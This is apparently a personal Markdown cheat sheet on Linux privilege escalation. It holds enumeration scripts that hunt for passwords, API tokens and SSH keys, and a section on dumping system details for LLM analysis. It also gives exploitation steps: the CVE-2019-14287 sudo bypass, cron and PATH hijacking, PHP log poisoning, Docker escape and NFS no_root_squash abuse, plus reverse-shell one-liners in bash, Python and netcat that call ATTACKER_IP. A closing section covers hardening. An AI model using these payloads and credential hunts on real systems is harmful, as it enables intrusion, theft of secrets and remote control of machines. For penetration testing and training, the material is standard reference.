# checklist-to-escalate

**Author:** Julien Bongars\
**Date:** 2025-10-13 01:17:38
**Path:** notes/escalation/linux/checklist-to-escalate.md

---

## Feed the AI

Gather comprehensive system information to analyze with LLMs for privesc vectors.

### Complete System Dump

```bash
#!/bin/bash
echo "=== SYSTEM INFORMATION ==="
uname -a
cat /etc/os-release
cat /proc/version

echo -e "\n=== CURRENT USER ==="
id
whoami
groups

echo -e "\n=== ALL USERS ==="
cat /etc/passwd

echo -e "\n=== SUDO PERMISSIONS ==="
sudo -l 2>/dev/null

echo -e "\n=== SUID BINARIES ==="
find / -perm -4000 -type f 2>/dev/null

echo -e "\n=== SGID BINARIES ==="
find / -perm -2000 -type f 2>/dev/null

echo -e "\n=== CAPABILITIES ==="
getcap -r / 2>/dev/null

echo -e "\n=== WRITABLE FILES ==="
find / -type f -writable 2>/dev/null | head -100

echo -e "\n=== WRITABLE DIRECTORIES ==="
find / -type d -writable 2>/dev/null | head -50

echo -e "\n=== RUNNING PROCESSES ==="
ps auxww

echo -e "\n=== NETWORK CONNECTIONS ==="
netstat -tulpn 2>/dev/null || ss -tulpn

echo -e "\n=== OPEN FILES & SOCKETS ==="
lsof 2>/dev/null | head -100

echo -e "\n=== CRON JOBS ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user crontab ==="; crontab -u $user -l 2>/dev/null; done

echo -e "\n=== SYSTEMD TIMERS ==="
systemctl list-timers --all 2>/dev/null

echo -e "\n=== MOUNTED FILESYSTEMS ==="
mount
cat /etc/fstab 2>/dev/null

echo -e "\n=== NFS EXPORTS ==="
cat /etc/exports 2>/dev/null

echo -e "\n=== INTERESTING FILES ==="
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.bak" -o -name "*.env" \) 2>/dev/null | head -100

echo -e "\n=== APPLICATION SOURCE CODE ==="
find / -type f \( -name "*.php" -o -name "*.py" -o -name "*.js" -o -name "package.json" -o -name "requirements.txt" \) 2>/dev/null | head -100

echo -e "\n=== READABLE PASSWORDS ==="
grep -r "password" /var/www /home /opt /etc 2>/dev/null | grep -v "Binary" | head -50

echo -e "\n=== SSH KEYS ==="
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.key" 2>/dev/null

echo -e "\n=== DOCKER INFO ==="
groups | grep docker
ls -la /var/run/docker.sock 2>/dev/null
docker ps 2>/dev/null

echo -e "\n=== KERNEL MODULES ==="
lsmod

echo -e "\n=== ENVIRONMENT VARIABLES ==="
env
```

### Quick One-Liner Dump

```bash
# Compact version for quick AI analysis
(echo "=== SYSTEM ===" && uname -a && cat /etc/os-release) && \
(echo -e "\n=== USER ===" && id && sudo -l 2>/dev/null) && \
(echo -e "\n=== SUID ===" && find / -perm -4000 2>/dev/null) && \
(echo -e "\n=== PROCESSES ===" && ps auxww) && \
(echo -e "\n=== NETWORK ===" && netstat -tulpn 2>/dev/null) && \
(echo -e "\n=== CRON ===" && cat /etc/crontab 2>/dev/null && ls -la /etc/cron.d/ 2>/dev/null)
```

### Focused Analysis Scripts

```bash
# Password hunting for AI
echo "=== PASSWORD PATTERNS ==="
grep -rni "password\|passwd\|pwd" /var/www /home /opt 2>/dev/null | grep -v "Binary" | head -100
grep -rni "api_key\|apikey\|secret\|token" /var/www /home /opt 2>/dev/null | grep -v "Binary" | head -100

# Configuration file analysis
echo "=== CONFIG FILES ==="
find / -type f -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# Service analysis
echo "=== SERVICES ==="
systemctl list-units --type=service --all 2>/dev/null
ps aux | awk '{print $1, $11}' | sort | uniq

# File permission issues
echo "=== PERMISSION ISSUES ==="
find / -perm -002 -type f 2>/dev/null | head -50  # World writable
find /etc -writable 2>/dev/null  # Writable /etc
```

---

## Automated Enumeration

### LinPEAS

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Via your web server
python3 -m http.server 8000
# On target: wget http://ATTACKER_IP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

# Via SSH
scp linpeas.sh user@target:/tmp/ && ssh user@target '/tmp/linpeas.sh'
```

### Other Tools

```bash
# Linux Smart Enumeration
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
./lse.sh -l 2

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
./LinEnum.sh
```

---

## Manual Enumeration

### System Information

```bash
# Kernel version (check for exploits)
uname -a
cat /etc/os-release
cat /proc/version

# Check architecture
uname -m
```

### User & Group Information

```bash
# Current user
id
whoami

# All users
cat /etc/passwd | grep -v nologin | grep -v false

# Sudoers
sudo -l
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# Groups
cat /etc/group
```

### SUID/SGID Files

```bash
# SUID binaries (runs as owner)
find / -perm -4000 -type f 2>/dev/null

# SGID binaries (runs as group)
find / -perm -2000 -type f 2>/dev/null

# Both
find / -perm -6000 -type f 2>/dev/null

# Check GTFOBins for exploits
https://gtfobins.github.io/
```

### Writable Files & Directories

```bash
# World-writable files
find / -type f -perm -002 2>/dev/null

# Writable by current user
find / -type f -writable 2>/dev/null

# Writable directories
find / -type d -writable 2>/dev/null

# Writable /etc files (critical)
find /etc -writable 2>/dev/null
```

### Processes & Services

```bash
# Running processes
ps aux
ps -eo user,pid,cmd
ps auxww  # Full command lines

# Network connections
netstat -tulpn
ss -tulpn

# Open files and sockets
lsof
lsof -i  # Network only

# Running as root
ps aux | grep root
```

### Scheduled Tasks

```bash
# System cron jobs
cat /etc/crontab
ls -la /etc/cron.*/*
cat /etc/cron.d/*

# User cron jobs
crontab -l
for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done

# Systemd timers
systemctl list-timers --all
```

### Capabilities

```bash
# Binaries with capabilities
getcap -r / 2>/dev/null

# Common dangerous capabilities
# CAP_SETUID, CAP_DAC_OVERRIDE, CAP_SYS_ADMIN
```

### File System

```bash
# Mounted file systems
mount
cat /etc/fstab

# NFS shares (check no_root_squash)
cat /etc/exports
showmount -e localhost

# Unusual mounts
df -h
```

### Password & Credential Hunting

```bash
# Search for passwords in files
grep -rni "password" /home /var/www /opt 2>/dev/null
grep -rni "passwd" /home /var/www /opt 2>/dev/null
grep -ErHni '.{0,100}password.{0,100}' / 2>/dev/null

# Common config files
cat /var/www/html/.env
cat /var/www/html/config.php
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.ssh/id_rsa

# Search for keys
find / -type f -name "*.key" 2>/dev/null
find / -type f -name "*_rsa" 2>/dev/null
grep -rn "BEGIN.*PRIVATE KEY" / 2>/dev/null

# Database credentials
find / -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -i "password\|user"
```

### Application Source Code

```bash
# Find web server root directories
grep -rn "DocumentRoot" /etc 2>/dev/null
grep -rn "root" /etc/nginx/sites-enabled/* 2>/dev/null
grep -rn "root" /etc/apache2/sites-enabled/* 2>/dev/null

# Find running web servers and their working directories
ps aux | grep -E "apache|nginx|httpd" | awk '{print $NF}'
ps aux | grep -E "python|node|ruby|php-fpm" | grep -v grep
lsof -i :80,8000,8080,3000,5000 2>/dev/null

# Check process working directories
for pid in $(ps aux | grep -E "python|node|php|ruby" | awk '{print $2}'); do 
  [ -d "/proc/$pid" ] && echo "PID $pid: $(readlink /proc/$pid/cwd)"; 
done 2>/dev/null

# Common web directories
ls -la /var/www/
ls -la /var/www/html/
ls -la /usr/share/nginx/
ls -la /opt/
ls -la /srv/

# PHP applications
find / -type f -name "*.php" 2>/dev/null
find / -type f -name "config.php" 2>/dev/null
find / -type f -name "wp-config.php" 2>/dev/null  # WordPress
find / -type f -name "configuration.php" 2>/dev/null  # Joomla
find /var/www -name "*.php" -exec grep -l "password\|db_pass\|mysql" {} \; 2>/dev/null

# Python applications
find / -type f -name "*.py" 2>/dev/null
find / -type f -name "app.py" -o -name "main.py" -o -name "wsgi.py" 2>/dev/null
find / -type f -name "requirements.txt" 2>/dev/null
find / -type f -name "pyproject.toml" 2>/dev/null
find / -type f -name "setup.py" 2>/dev/null
find / -type d -name "__pycache__" 2>/dev/null
find / -type d -name "venv" -o -name ".venv" -o -name "env" 2>/dev/null
find / -name "*.pyc" 2>/dev/null  # Compiled Python (can decompile)

# Node.js/JavaScript applications
find / -type f -name "*.js" 2>/dev/null
find / -type f -name "package.json" 2>/dev/null
find / -type f -name "package-lock.json" 2>/dev/null
find / -type f -name "yarn.lock" 2>/dev/null
find / -type d -name "node_modules" 2>/dev/null
find / -type f -name "server.js" -o -name "app.js" -o -name "index.js" 2>/dev/null
find / -name ".npmrc" -o -name ".yarnrc" 2>/dev/null

# Ruby applications
find / -type f -name "*.rb" 2>/dev/null
find / -type f -name "Gemfile" 2>/dev/null
find / -type f -name "config.ru" 2>/dev/null
find / -type f -name "database.yml" 2>/dev/null  # Rails

# Java applications
find / -type f -name "*.jar" 2>/dev/null
find / -type f -name "*.war" 2>/dev/null
find / -type f -name "pom.xml" 2>/dev/null  # Maven
find / -type f -name "build.gradle" 2>/dev/null  # Gradle
find / -type f -name "application.properties" 2>/dev/null  # Spring Boot
find / -type f -name "application.yml" 2>/dev/null

# Go applications
find / -type f -name "go.mod" 2>/dev/null
find / -type f -name "go.sum" 2>/dev/null
find / -type f -name "main.go" 2>/dev/null

# Configuration files
find / -type f -name ".env" 2>/dev/null
find / -type f -name ".env.local" -o -name ".env.production" 2>/dev/null
find / -type f -name "config.json" -o -name "config.yaml" -o -name "config.toml" 2>/dev/null
find / -type f -name "settings.py" 2>/dev/null  # Django
find / -type f -name "web.config" 2>/dev/null  # ASP.NET

# Database configuration
find / -name "database.yml" -o -name "db.config" 2>/dev/null
find / -name ".my.cnf" 2>/dev/null  # MySQL credentials
find / -name "mongod.conf" 2>/dev/null
find / -name "redis.conf" 2>/dev/null

# Docker & container files
find / -name "Dockerfile" 2>/dev/null
find / -name "docker-compose.yml" -o -name "docker-compose.yaml" 2>/dev/null
find / -name ".dockerignore" 2>/dev/null
ls -la /.dockerenv 2>/dev/null  # Check if in container

# CI/CD files (often contain secrets)
find / -name ".gitlab-ci.yml" 2>/dev/null
find / -name ".github" -type d 2>/dev/null
find / -name "Jenkinsfile" 2>/dev/null
find / -name ".circleci" -type d 2>/dev/null
find / -name "azure-pipelines.yml" 2>/dev/null

# Version control
find / -name ".git" -type d 2>/dev/null
find / -name ".svn" -type d 2>/dev/null
find / -name ".gitignore" 2>/dev/null

# IDE and editor files
find / -name ".vscode" -type d 2>/dev/null
find / -name ".idea" -type d 2>/dev/null  # JetBrains
find / -name "*.swp" 2>/dev/null  # Vim swap files

# Documentation (might contain setup instructions)
find / -type f -name "README*" 2>/dev/null
find / -type f -name "INSTALL*" 2>/dev/null
find / -type f -name "CHANGELOG*" 2>/dev/null
find / -type f -name "TODO*" 2>/dev/null
find / -type f -name "notes.txt" 2>/dev/null

# Extract useful info from found files
grep -r "password\|api_key\|secret\|token" /var/www 2>/dev/null | grep -v "Binary"
grep -r "mysql\|postgres\|mongodb" /var/www 2>/dev/null | grep -v "Binary"
```

### Backup & Archive Files

```bash
# Common archive formats
find / -type f \( -name "*.zip" -o -name "*.tar" -o -name "*.tar.gz" -o -name "*.tgz" \) 2>/dev/null
find / -type f \( -name "*.tar.bz2" -o -name "*.tar.xz" -o -name "*.rar" -o -name "*.7z" \) 2>/dev/null
find / -type f -name "*.gz" 2>/dev/null
find / -type f -name "*.bz2" 2>/dev/null

# Backup file patterns
find / -type f -name "*.bak" 2>/dev/null
find / -type f -name "*.backup" 2>/dev/null
find / -type f -name "*.old" 2>/dev/null
find / -type f -name "*.orig" 2>/dev/null
find / -type f -name "*.save" 2>/dev/null
find / -type f -name "*~" 2>/dev/null  # Editor backups
find / -type f -name "*.swp" 2>/dev/null  # Vim swap files
find / -type f -name "*.swo" 2>/dev/null

# Database backups
find / -type f -name "*.sql" 2>/dev/null
find / -type f -name "*.sql.gz" 2>/dev/null
find / -type f -name "*.dump" 2>/dev/null
find / -type f -name "*.db" 2>/dev/null
find / -type f -name "*.sqlite" 2>/dev/null
find / -type f -name "*.sqlite3" 2>/dev/null

# VM and disk images
find / -type f -name "*.vmdk" -o -name "*.vdi" -o -name "*.qcow2" 2>/dev/null
find / -type f -name "*.iso" 2>/dev/null
find / -type f -name "*.img" 2>/dev/null

# System backup directories
ls -la /var/backups/
ls -la /backup/
ls -la /backups/
ls -la /root/backup/
ls -la /home/*/backup/ 2>/dev/null

# Temporary directories (often contain sensitive data)
ls -la /tmp/
ls -la /var/tmp/
ls -la /dev/shm/
find /tmp -type f -name "*.txt" -o -name "*.log" 2>/dev/null
find /var/tmp -type f 2>/dev/null

# Web server backup locations
ls -la /var/www/backups/ 2>/dev/null
ls -la /var/www/html/backup/ 2>/dev/null
ls -la /var/www/backup/ 2>/dev/null

# User home directory backups
find /home -name "*.zip" -o -name "*.tar.gz" 2>/dev/null
find /home -name "backup*" 2>/dev/null
find /root -name "*.zip" -o -name "*.tar.gz" 2>/dev/null

# Log files (can contain credentials)
find /var/log -type f -readable 2>/dev/null
ls -la /var/log/
cat /var/log/auth.log 2>/dev/null | grep -i "password\|failed"
cat /var/log/apache2/access.log 2>/dev/null | grep -i "password\|token"
cat /var/log/nginx/access.log 2>/dev/null | grep -i "password\|token"

# Application-specific backups
ls -la /var/lib/mysql/ 2>/dev/null
ls -la /var/lib/postgresql/ 2>/dev/null
ls -la /var/lib/mongodb/ 2>/dev/null

# Look for recently modified archives (recent backups)
find / -type f \( -name "*.zip" -o -name "*.tar*" -o -name "*.bak" \) -mtime -7 2>/dev/null

# Check archive contents without extracting
zipinfo suspicious.zip 2>/dev/null
tar -tzf suspicious.tar.gz 2>/dev/null
tar -tjf suspicious.tar.bz2 2>/dev/null

# Extract interesting files from archives
unzip -l archive.zip | grep -E "\.env|config|password|key"
tar -xzf archive.tar.gz --wildcards "*.env" "config.*" 2>/dev/null
```

### Logs & Audit

```bash
# System logs
cat /var/log/syslog
cat /var/log/auth.log
cat /var/log/secure

# Audit logs (LAUREL)
cat /var/log/laurel/audit.log

# Application logs
find /var/log -type f -readable 2>/dev/null
```

### Docker & Containers

```bash
# Check if in container
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# Docker socket (easy privesc)
ls -la /var/run/docker.sock

# Docker group membership
groups | grep docker
```

### Sockets & IPC

```bash
# Unix sockets
find / -type s 2>/dev/null

# Weak permissions on sockets
find /run -type s -perm -666 2>/dev/null
find /var/run -type s -perm -666 2>/dev/null

# Notable sockets
ls -la /run/snapd.socket
ls -la /run/dbus/system_bus_socket
```

---

## Common Exploitation Techniques

### Sudo Misconfigurations

```bash
# Check sudo version
sudo --version

# Exploit sudo < 1.8.28 (CVE-2019-14287)
sudo -u#-1 /bin/bash

# GTFOBins for allowed commands
# https://gtfobins.github.io/
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel $(uname -r)

# Common exploits
# DirtyCow, Dirty Pipe, PwnKit
```

### Writable Scripts in Root Cron

```bash
# Find writable cron scripts
ls -la /etc/cron.d/*
for f in $(find /etc/cron* -type f); do [ -w "$f" ] && echo "$f"; done

# Add reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh
```

### Path Hijacking

```bash
# Check PATH
echo $PATH

# Find writable directories in PATH
echo $PATH | tr ':' '\n' | while read d; do [ -w "$d" ] && echo "$d"; done

# Create malicious binary
echo '#!/bin/bash\nbash -i' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
```

### LFI to RCE

```bash
# Log poisoning
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# Then: ?file=/var/log/apache2/access.log&cmd=id

# Session poisoning
# Inject PHP into session variable, then include session file

# /proc/self/environ
curl -A "<?php system('id'); ?>" http://target/
# Then: ?file=/proc/self/environ
```

### Docker Escape

```bash
# If you're in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# If docker.sock is writable
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### NFS no_root_squash

```bash
# On attacker machine
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/shared /tmp/nfs
cp /bin/bash /tmp/nfs/
chmod +s /tmp/nfs/bash

# On target
/shared/bash -p
```

---

## Prevention & Hardening

### User & Permission Hardening

```bash
# Disable root SSH login
echo "PermitRootLogin no" >> /etc/ssh/sshd_config

# Disable password authentication (use keys only)
echo "PasswordAuthentication no" >> /etc/ssh/sshd_config
systemctl restart sshd

# Remove unnecessary SUID/SGID
find / -perm -4000 -type f 2>/dev/null | xargs chmod -s  # Review first!

# Restrict sudo access
visudo  # Remove NOPASSWD, limit commands

# Strong password policies
apt install libpam-pwquality
vi /etc/security/pwquality.conf
```

### File System Hardening

```bash
# Mount /tmp with noexec
echo "tmpfs /tmp tmpfs defaults,noexec,nosuid 0 0" >> /etc/fstab

# Set proper permissions
chmod 700 /root
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chmod 600 /etc/ssh/sshd_config

# Remove world-writable files
find / -xdev -type f -perm -002 -exec chmod o-w {} \;

# Secure /etc/exports for NFS
# Never use: no_root_squash, no_all_squash
```

### Service Hardening

```bash
# Disable unnecessary services
systemctl list-unit-files | grep enabled
systemctl disable service_name

# Run services as non-root
# Use systemd User= directive

# Firewall rules
ufw enable
ufw default deny incoming
ufw allow 22/tcp
```

### Monitoring & Logging

```bash
# Enable auditd
apt install auditd
systemctl enable auditd

# Enable LAUREL for readable logs
# https://github.com/threathunters-io/laurel

# Monitor failed login attempts
fail2ban-client status sshd

# Log all sudo commands
echo "Defaults log_output" >> /etc/sudoers
echo "Defaults!/usr/bin/sudoreplay !log_output" >> /etc/sudoers
```

### Application Security

```bash
# Keep system updated
apt update && apt upgrade -y

# Remove development tools from production
apt remove gcc make

# Secure application configurations
chmod 640 /var/www/html/.env
chown root:www-data /var/www/html/.env

# Disable unnecessary PHP functions
# disable_functions = exec,passthru,shell_exec,system,proc_open,popen
```

### Kernel & System Hardening

```bash
# Enable ASLR
echo 2 > /proc/sys/kernel/randomize_va_space

# Disable core dumps
echo "* hard core 0" >> /etc/security/limits.conf

# Enable SELinux or AppArmor
# SELinux: enforcing
# AppArmor: aa-enforce /etc/apparmor.d/*

# Kernel parameters
cat >> /etc/sysctl.conf << EOF
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
EOF
sysctl -p
```

### Docker Security

```bash
# Don't add users to docker group (equivalent to root)
# Use rootless docker instead

# Run containers as non-root
docker run --user 1000:1000 ...

# Read-only root filesystem
docker run --read-only ...

# Drop capabilities
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE ...

# Secure docker socket
chmod 660 /var/run/docker.sock
chown root:docker /var/run/docker.sock
```

### Regular Audits

```bash
# Run security audit tools
lynis audit system

# Check for rootkits
rkhunter --check
chkrootkit

# Review logs regularly
grep -i "failed\|error" /var/log/auth.log
journalctl -p err -b

# Monitor file integrity
aide --init
aide --check
```

---

## Quick Reference

### GTFOBins Commands

```bash
# If binary has SUID
binary -p

# Common exploitable SUID binaries
vim, find, nmap, perl, python, ruby, php, awk, bash, less, more, nano
```

### Reverse Shells

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Netcat
nc -e /bin/sh ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Stabilize Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
reset
stty rows 38 columns 116
```

---

## Resources

- GTFOBins: https://gtfobins.github.io/
- PEASS-ng (LinPEAS): https://github.com/carlospolop/PEASS-ng
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks: https://book.hacktricks.xyz/
- Linux Privilege Escalation: https://payatu.com/blog/a-guide-to-linux-privilege-escalation/
